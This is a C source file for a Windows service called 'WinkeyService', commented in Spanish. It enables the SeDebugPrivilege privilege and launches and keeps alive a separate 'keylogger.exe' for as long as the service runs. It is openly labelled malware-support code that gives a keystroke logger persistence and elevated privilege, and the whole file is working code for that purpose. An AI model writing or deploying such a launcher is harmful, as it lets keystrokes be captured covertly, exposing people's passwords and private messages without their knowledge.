#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <time.h>  // Para manejo de time() y localtime()

#pragma comment(lib, "Advapi32.lib")

#define SERVICE_NAME  L"WinkeyService"
#define LOG_FILE_NAME L"winkey.log"
#define ERROR_LOG_FILE L"winkeyerror.log"
#define MAX_PATH_LEN 260

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;
HANDLE stopEvent = NULL;
PROCESS_INFORMATION pi;
STARTUPINFOW si;  // Usar STARTUPINFOW para compatibilidad con UNICODE
wchar_t logFilePath[MAX_PATH_LEN];

// Prototipos
void WINAPI ServiceCtrlHandler(DWORD ctrlCode);
void WINAPI ServiceMain(DWORD argc, LPWSTR* argv);
void logError(const wchar_t* format, ...);
void launchKeylogger();
void EnableDebugPrivilege();

// Función para obtener el directorio del ejecutable
void getExecutableDirectory(wchar_t* exeDir, size_t max_size) {
    wchar_t exePath[MAX_PATH_LEN];
    DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH_LEN);
    if (length == 0 || length == MAX_PATH_LEN) {
        wprintf(L"Failed to get executable path.\n");
        return;
    }

    wchar_t* lastBackslash = wcsrchr(exePath, L'\\');
    if (lastBackslash != NULL) {
        *lastBackslash = L'\0';
        wcscpy_s(exeDir, max_size, exePath);
    }
}

// Función para registrar errores
void logError(const wchar_t* format, ...) {
    wchar_t errorLogPath[MAX_PATH_LEN];
    wcscpy_s(errorLogPath, MAX_PATH_LEN, logFilePath);
    wcscat_s(errorLogPath, MAX_PATH_LEN, L"\\winkeyerror.log");

    FILE* file = _wfopen(errorLogPath, L"a+");
    if (file == NULL) {
        wprintf(L"Failed to open error log file: %ls\n", errorLogPath);
        return;
    }

    time_t now = time(NULL);  // Capturar el tiempo actual
    struct tm* localTime = localtime(&now);  // Convertir el tiempo en formato local

    if (localTime) {
        fwprintf(file, L"[%04d-%02d-%02d %02d:%02d:%02d] ",
                 localTime->tm_year + 1900,
                 localTime->tm_mon + 1,
                 localTime->tm_mday,
                 localTime->tm_hour,
                 localTime->tm_min,
                 localTime->tm_sec);
    }

    va_list args;
    va_start(args, format);
    vfwprintf(file, format, args);
    va_end(args);

    fclose(file);
}

// Habilitar privilegio SeDebugPrivilege para el servicio
void EnableDebugPrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        wprintf(L"Failed to open process token. Error: %lu\n", GetLastError());
        return;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        wprintf(L"Failed to lookup privilege value. Error: %lu\n", GetLastError());
        CloseHandle(hToken);
        return;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        wprintf(L"Failed to adjust token privileges. Error: %lu\n", GetLastError());
    }

    CloseHandle(hToken);
}

// Función para iniciar el keylogger
void launchKeylogger() {
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    wchar_t keyloggerPath[MAX_PATH_LEN];
    wcscpy_s(keyloggerPath, MAX_PATH_LEN, logFilePath);
    wcscat_s(keyloggerPath, MAX_PATH_LEN, L"\\keylogger.exe");  // Asumimos que el keylogger se llama "keylogger.exe"

    if (!CreateProcessW(keyloggerPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        logError(L"Failed to start keylogger process. Error: %lu\n", GetLastError());
    } else {
        logError(L"Keylogger process started successfully.\n");
    }
}

// Función del servicio principal
void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
    (void)argc;
    (void)argv;

    serviceStatusHandle = RegisterServiceCtrlHandlerW(SERVICE_NAME, ServiceCtrlHandler);
    if (!serviceStatusHandle) {
        logError(L"Failed to register service control handler.\n");
        return;
    }

    serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    serviceStatus.dwCurrentState = SERVICE_START_PENDING;
    serviceStatus.dwWin32ExitCode = NO_ERROR;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwWaitHint = 0;

    SetServiceStatus(serviceStatusHandle, &serviceStatus);

    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!stopEvent) {
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        logError(L"Failed to create stop event.\n");
        SetServiceStatus(serviceStatusHandle, &serviceStatus);
        return;
    }

    // Habilitar privilegios de depuración
    EnableDebugPrivilege();

    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);

    // Obtener el directorio del ejecutable y preparar el archivo de log
    getExecutableDirectory(logFilePath, MAX_PATH_LEN);

    // Lanzar el proceso keylogger
    launchKeylogger();

    // Esperar a que el servicio sea detenido
    WaitForSingleObject(stopEvent, INFINITE);

    // Finalizar el proceso del keylogger cuando el servicio se detenga
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    serviceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}

// Manejador de control de servicio
void WINAPI ServiceCtrlHandler(DWORD ctrlCode) {
    switch (ctrlCode) {
    case SERVICE_CONTROL_STOP:
        if (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
            serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(serviceStatusHandle, &serviceStatus);
            SetEvent(stopEvent);
        }
        break;
    default:
        break;
    }
}

// Función principal para iniciar el servicio
int wmain(int argc, wchar_t* argv[]) {
    (void)argc;
    (void)argv;

    SERVICE_TABLE_ENTRYW serviceTable[] = {
        { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTIONW)ServiceMain },
        { NULL, NULL }
    };

    if (!StartServiceCtrlDispatcherW(serviceTable)) {
        logError(L"Failed to start service control dispatcher. Error: %lu\n", GetLastError());
    }

    return 0;
}
